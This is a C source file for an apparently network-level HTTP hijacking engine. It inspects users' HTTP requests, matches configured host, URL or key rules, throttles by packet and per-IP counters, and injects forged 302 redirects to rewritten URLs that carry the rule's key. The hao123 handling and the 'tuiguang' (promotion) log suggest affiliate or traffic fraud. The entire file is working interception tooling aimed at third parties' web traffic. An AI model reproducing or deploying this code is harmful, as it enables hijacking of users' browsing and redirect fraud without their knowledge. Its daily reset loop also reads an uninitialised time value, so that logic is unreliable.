#include "boots.h"
#include "bts_debug.h"
#include "bts_cnt.h"

#include "naga_types.h"
#include "naga_hijack.h"
#include "itf.h"
#include "packet.h"
#include "packet_http.h"
#include "hijack_cmd.h"
#include "hijack.h"
#include "bts_util.h"
#include "bts_cnt.h"


#define DEBUG
#ifdef  DEBUG   
#define debug(fmt,args...)  printf ("func(%s), line(%d)"fmt"\n" ,__FUNCTION__, __LINE__, ##args)
#else   
#define debug(fmt,args...)   
#endif  /* DEBUG */ 

time_t   hijack_timep; 

static uint64_t  g_hijack_pkt_cnt = 0; 
static uint64_t  g_hijack_ip_cnt = 0;

extern uint32_t  g_hijack_pkt_interval;
extern uint32_t  g_hijack_ip_interval;
extern uint32_t  g_hijack_ip_pkt_interval;
extern uint32_t  g_hijack_differ_ip_time_interval;
extern uint32_t  g_hijack_switch_enable;

extern char hijack_log_path[256];

#define MAX_IP_ENTRY_NUM 100


#define HIJACK_LATER_BLUR_FLAG    8
#define HIJACK_LATER_NOT_FLAG     1
#define HIJACK_LATER_EXACT_FLAG   2  
#define HIJACK_LATER_OUR_FLAG     4  


#define  HAO123   1
#define  NEW_HAO123_IP   2

static hijack_ip_t *hijack_ip_new(void)
{
	hijack_ip_t *entry = NULL;

	entry = malloc(sizeof(hijack_ip_t));
	if (NULL != entry)
	{
		memset(entry, 0, sizeof(hijack_ip_t));
	}

	return entry;
}

static  hijack_ip_t *ip_session_process(uint32_t ip, uint8_t *hao123_flag)
{
    char ip_str[MAX_IPSTR_LEN] = {0};
    hijack_ip_t *entry = NULL;
    bts_ip_string(ip, ip_str);

    entry = api_hijack_ip_get(ip_str);
    if (NULL == entry)
    {
        g_hijack_ip_cnt++;
        CNT_INC(HIJACK_SIP_NOT_REPEAT);
        entry = hijack_ip_new();
        if (NULL == entry)
        {
            return NULL;
        }
        entry->ip_str_len = strlen(ip_str);
        memcpy(entry->ip_str, ip_str, strlen(ip_str));
        if (E_SUCCESS != api_hijack_ip_add(entry)) 
        {
            return NULL; 
        }

        *hao123_flag |= NEW_HAO123_IP;
    }
    else
    {
        CNT_INC(HIJACK_SIP_REPEAT);
        
    }
    
    return entry;
}


static  berr hijack_rule_match(hytag_t *hytag, hijack_rule_t **rule, uint8_t *hijack_flag)
{
    int i;
    hijack_entry_t *ptr = NULL;

    ptr = api_get_hijack_table_ptr();
    if ((NULL == ptr)||(NULL == rule) ||(NULL == hytag) || (NULL == hijack_flag))
    {
	    return E_FAIL;
    }

    //sprintf(url, "%s%s", host, uri);
	
    for ( i = 0; i < HIJACK_RULE_NUM_MAX; i++)
    {
        
        if(ptr[i].effective == HIJACK_RULE_UNEFFECTIVE)
        {
            continue;			
        }

	if (HIJACK_GLOBAL_MODE == ptr[i].hijack.mode)
	{
	    if (!strncmp(hytag->url, ptr[i].hijack.key, strlen(ptr[i].hijack.key)))
            {
                *hijack_flag = HIJACK_GLOBAL_MODE;
            }
	}
	else if ((HIJACK_KEY_MODE == ptr[i].hijack.mode) || (HIJACK_URL_MODE == ptr[i].hijack.mode))
	{
	    if (!strcmp(hytag->host, ptr[i].hijack.host))
            {
                *hijack_flag = HIJACK_KEY_MODE;
            }

            if (HIJACK_URL_MODE == ptr[i].hijack.mode)
            { 
	        if (!strncmp(hytag->url, ptr[i].hijack.key, strlen(ptr[i].hijack.key)))
	        {
	            *hijack_flag = HIJACK_URL_MODE;
		}
            }
	}
        else
        {
            continue;
        }

	if ( 0 != *hijack_flag)
	{
            *rule = &ptr[i].hijack;
            return E_SUCCESS;  
	}
	else
	{
            continue;
	}
		
    }
    return E_NULL;
}


#define PRINTF_PACKET(_p, _len) \
    do{ \
         int _i; \
         for(_i=0; _i<_len; _i++)\
         {\
            if(_i%16==0)\
            {\
                printf("\n");\
            }\
            printf("%02x ", *((uint8_t *)_p + _i) );\
         }\
     }while(0)



berr naga_hijack(hytag_t *hytag)
{

    berr rv;
    struct rte_mbuf *txm = NULL;
    unsigned char buffer[2048]; 

    hijack_ip_t *entry = NULL;
    hijack_rule_t *rule = NULL;
    char hijack_url[1024] = {0};
    char uri_interval[512]  = {0};
    time_t hijack_ip_time;
    uint64_t hijack_ip_time_gap = 0;

    uint8_t hijack_flag = 0;
    uint8_t hao123_flag = 0;

    hytag->match = 0;


    if (!g_hijack_switch_enable)
    {
        return E_SUCCESS;
    }

    if(NULL == hytag)
    {
        //CNT_INC(ADP_DROP_PARAM);
        //BRET(E_PARAM);
        return E_SUCCESS;
    }
    
    /* */
    if( APP_TYPE_HTTP_GET_OR_POST != hytag->app_type)
    {
        CNT_INC(HIJACK_DROP_GET_OR_POST);
        return E_SUCCESS;
    }

    if (ACT_DROP == (hytag->acl.actions & ACT_DROP))
    {
        //printf("%s.%d: http://%s%s\n", __func__, __LINE__, hytag->host, hytag->uri);
        CNT_INC(HIJACK_DROP_ACT_DROP);
        return E_SUCCESS;
    }

    if (hytag->url_len > 512)
    {
        CNT_INC(HIJACK_LONG_URI_DROP);
        return E_SUCCESS;
    }

    CNT_INC(HIJACK_IPKTS);

    if(hytag->uri_len == 1 && !strcmp(hytag->uri, "/"))
    {    
        CNT_INC(URL_HOMEPAGE);
        return E_SUCCESS;
    }



    if(E_SUCCESS != hijack_rule_match(hytag, &rule, &hijack_flag))
    {
        CNT_INC(HIJACK_RULE_NOT_MATCH);
        return E_SUCCESS;
    }


    if (HIJACK_KEY_MODE == rule->mode)
    {
        if (NULL != strstr(hytag->uri, rule->key)) 
        {
            //printf("%s.%d, hytag->uri : %s, key: %s, host: %s, index: %d\n", __func__, __LINE__, hytag->uri, rule->key, rule->host, rule->index);
            CNT_INC(HIJACK_KEY_MATCH_DROP);
          
            ACL_PUSHED_ASSERT_HIT(rule->acl);
          
            hytag->match |= HIJACK_LATER_OUR_FLAG;
            return E_SUCCESS;
        }
    }
    else
    {
        if ((HIJACK_GLOBAL_MODE == hijack_flag) || (HIJACK_URL_MODE == hijack_flag))
        {
            hytag->match |= HIJACK_LATER_OUR_FLAG; 
            ACL_PUSHED_ASSERT_HIT(rule->acl);
            CNT_INC(HIJACK_URL_MATCH_DROP);
            return E_SUCCESS;
        }
    }
    
    

    g_hijack_pkt_cnt ++;
    if (g_hijack_pkt_cnt % g_hijack_pkt_interval != 0)
    {
        CNT_INC(HIJACK_PKT_PERCENT_MATCH_FAIL);
        return E_SUCCESS;
    }

    if (!strcmp(hytag->host, "www.hao123.com"))
    {
        hao123_flag |= HAO123;
    }

#if 1
    entry = ip_session_process(hytag->outer_srcip4, &hao123_flag);
    if(NULL == entry)
    {
        CNT_INC(HIJACK_IP_SESSION_FAIL);
        return E_SUCCESS;
    }
    
    

    if (g_hijack_ip_cnt % g_hijack_ip_interval != 0)
    {
        CNT_INC(HIJACK_IP_PERCENT_MATCH_FAIL);
        return E_SUCCESS;
    }

    if ((uint64_t)(entry->acl.cnt.cnt) % g_hijack_ip_pkt_interval != 0)
    {
        CNT_INC(HIJACK_IP_PKT_PERCENT_MATCH_FAIL);
        return E_SUCCESS;
    }

    time(&hijack_ip_time);
    if ((uint64_t)(entry->acl.cnt.cnt) != 0)
    {
        hijack_ip_time_gap = (uint64_t)(hijack_ip_time - entry->pri_time); 
        if (hijack_ip_time_gap < g_hijack_differ_ip_time_interval)
        {
            CNT_INC(HIJACK_TIME_PERCENT_MATCH_FAIL);
            return E_SUCCESS;
        }
    }

#endif	
    CYCLE_INIT(1);

    
    hytag->match |= HIJACK_LATER_BLUR_FLAG;
    hytag->hijack_rule_id = rule->index;

    
    if (HIJACK_KEY_MODE == rule->mode)
    {
        char *locate_ptr = strstr(hytag->uri, rule->locate);       
        if (NULL == locate_ptr)
        {
            hytag->match |= HIJACK_LATER_NOT_FLAG;
            return E_SUCCESS;
        }
        else
        {
            hytag->match |= HIJACK_LATER_EXACT_FLAG;
            memcpy(uri_interval, hytag->uri, (hytag->uri_len - strlen(locate_ptr)));
            char *key_end_ptr = strstr(locate_ptr, "&");
            if (NULL == key_end_ptr)
            {
                snprintf(hijack_url, 1024, "http://%s%s%s%s", rule->host, uri_interval, rule->locate, rule->key);
                //printf("%s.%d: Dst url is : %s, src url is http://%s/%s", 
                       //__func__, __LINE__, hijack_url, hytag->host, hytag->uri);
            }
            else
            {
                snprintf(hijack_url, 1024, "http://%s%s%s%s%s", rule->host, uri_interval, rule->locate, rule->key, key_end_ptr);
                //printf("%s.%d: Dst url is : %s, src url is http://%s/%s", 
                      // __func__, __LINE__, hijack_url, hytag->host, hytag->uri);
            }
        }
        
        //printf("%s.%d, hijack url is %s\n", __func__, __LINE__, hijack_url);
    }
    else
    {
        snprintf(hijack_url, 1024, "http://%s%s", rule->key, hytag->reg);
    }
    //printf("hijack url is: %s.\n", hijack_url);

    CNT_INC(HIJACK_ALL_CAN_PUSH);

    if(hytag->eth_tx == ENABLE)
    {
        CYCLE_START();

	    memcpy(buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
	    rv = redirect_302_response_generator(buffer, hytag, hijack_url);

	    if(rv != E_SUCCESS) 
        {
	        CNT_INC(HIJACK_DROP_HEAD_GEN1);
	        return rv;
	    }
        //printf("buffer is : %s\n", (char *)buffer + hytag->l5_offset);

	    CYCLE_END();

	    CYCLE_START();
	    rv = ift_raw_send_packet(hytag->fp, buffer, hytag->data_len);
	    if(rv != E_SUCCESS)
	    {
	        CNT_INC(HIJACK_DROP_SEND_PACKET1);
	        return rv;
	    }
        //PRINTF_PACKET(buffer, hytag->data_len);
	    CYCLE_END();
   }  
   else
   {

        if (NULL != hytag->m)
        {
            txm = hytag->m;  
    	    rv = redirect_302_response_generator(hytag->pbuf.ptr, hytag, hijack_url);
	        if(rv != E_SUCCESS) 
            {
		        CNT_INC(HIJACK_DROP_HEAD_GEN1);
		        return rv;
            }

            txm->data_len = txm->pkt_len = hytag->data_len;
            itf_send_packet_imm(txm, txm->port);

        }
   }

   
   time(&(entry->pri_time));
   ACL_HIT(entry->acl);
   if (hao123_flag & HAO123)
   {
         if (hao123_flag & NEW_HAO123_IP)
         {
             ACL_HIT(rule->acl);
         }
   }
   else
   {
         ACL_HIT(rule->acl);
   }
   
   CNT_INC(HIJACK_PUSH_TX_SUCCESS);
   return E_SUCCESS;

}


berr hijack_table_reset()
{
    int i;
    uint32_t total = 0;
    berr rv;
    g_hijack_pkt_cnt = 1;
    g_hijack_ip_cnt = 1;

    rv = api_hijack_ip_clear();
    if (E_SUCCESS != rv)
    {
        printf("ip session table clear fail!\n");
    }

    for (i = 0; i < CNT_MAX; i++)
    {
        cnt_clear(i, 1, &total);
    }
    
    return rv;
}


berr hijack_record()
{
    berr rv;
    int i;
    FILE *fp = NULL;
    hijack_entry_t *ptr = NULL;
    time_t now;

    fp = fopen(hijack_log_path, "a");
    if (NULL == fp)
    {
        printf("open tuiguang.log fail!\n");
        return E_FAIL;
    }
    time(&now);

    fprintf(fp, "%s\n", ctime(&now));

    ptr = api_get_hijack_table_ptr();
    if (NULL == ptr)
    {
        printf("%s.%d\n", __func__, __LINE__);
        return E_FAIL;
    }

    for ( i = 0; i < HIJACK_RULE_NUM_MAX; i++)
    {
        if(ptr[i].effective == HIJACK_RULE_EFFECTIVE)
        {
             fprintf(fp, "%s: %lld,  %lld\n", ptr[i].hijack.host, (uint64_t)ptr[i].hijack.acl.cnt.cnt, (uint64_t)ptr[i].hijack.acl.pushed_cnt.cnt);  
             rv = api_hijack_clear_stat(ptr[i].hijack.index);
             if (rv != E_SUCCESS)
             {
                 printf("%s.%d\n", __func__, __LINE__);
                 return E_FAIL;
             }
        } 
    } 

    fprintf(fp, "***************************************************************\n");
    fclose(fp);
    
    return E_SUCCESS;

}


void *time_check_loop(void *parm)
{
    berr rv;
    time_t hijack_time;
    struct tm* local;
    local = gmtime(&hijack_time);
    uint8_t flag = 0;
    while(1)
    {
        time(&hijack_time);
        ctime(&hijack_time);
        if (1 == flag)
        {
            sleep(120);
            flag = 0;
        }
        if ((local->tm_sec < 10) && (local->tm_min == 0) &&(local->tm_hour == 0)) 
        {

            rv = hijack_table_reset();
            if (E_SUCCESS != rv)
            {
                continue;
            }
            rv = hijack_record();
            if (E_SUCCESS != rv)
            {
                continue;
            }

            flag = 1;
        }
        
        sleep(3);
    }
    return NULL;
}


void hijack_dp_init(void)
{
    berr rv;
    time(&hijack_timep);
    rv = hijack_ip_init(MAX_IP_ENTRY_NUM);
    if (E_SUCCESS != rv)
    {
	printf("Hijack init FAIL!\n");
    }
    else
    {
	printf("Hijack init success!\n");
    }

    hijack_init();
    return;
}

